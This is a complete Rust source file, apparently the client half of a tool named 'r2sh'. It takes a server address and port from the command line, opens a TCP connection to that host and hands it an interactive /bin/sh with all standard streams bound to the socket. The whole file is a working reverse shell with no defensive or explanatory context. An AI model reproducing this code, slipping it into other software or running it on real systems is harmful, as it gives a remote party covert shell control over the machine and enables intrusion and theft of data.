use std::env::args;
use std::net::TcpStream;
use std::os::fd::{AsRawFd, FromRawFd};
use std::process::{exit, Command, Stdio};
use getopts::Options;

use r2sh::show_usage;

fn parse_args() -> Option<(String, u16)> {
    let mut opts = Options::new();
    let args = args().collect::<Vec<String>>();

    opts.optopt("p", "port", "Specify the server port", "port");
    opts.optopt("s", "addr", "Specify the server address", "addr");
    opts.optflag("h", "help", "Show this message");

    if args.len() == 1 {
        show_usage(&args[0], opts);
        return None
    }

    let parsed_opts = opts.parse(&args[1..]).unwrap();
    if ! parsed_opts.opt_present("s") || ! parsed_opts.opt_present("p")
        || parsed_opts.opt_present("h") {
        show_usage(&args[0], opts);
        return None
    }

    let addr = parsed_opts.opt_str("s")?;
    let port = parsed_opts.opt_str("p")?;

    Some((addr, port.parse().unwrap()))
}

fn exec_shell(fd: i32) {
    Command::new("/bin/sh")
        .arg("-i")
        .stdin(unsafe { Stdio::from_raw_fd(fd) })
        .stdout(unsafe { Stdio::from_raw_fd(fd) })
        .stderr(unsafe { Stdio::from_raw_fd(fd) })
        .spawn()
        .unwrap()
        .wait()
        .unwrap();
}

fn run(addr: String, port: u16) {
    println!("[+] trying to connect to server...");

    match TcpStream::connect((addr, port)) {
        Ok(sock) => {
            println!("[+] connection established!");
            exec_shell(sock.as_raw_fd())
        },
        Err(_) => println!("[-] fail to connect to server!")
    }
}

fn main() {
    match parse_args() {
        Some((addr, port)) => run(addr, port),
        None => exit(1)
    }
}
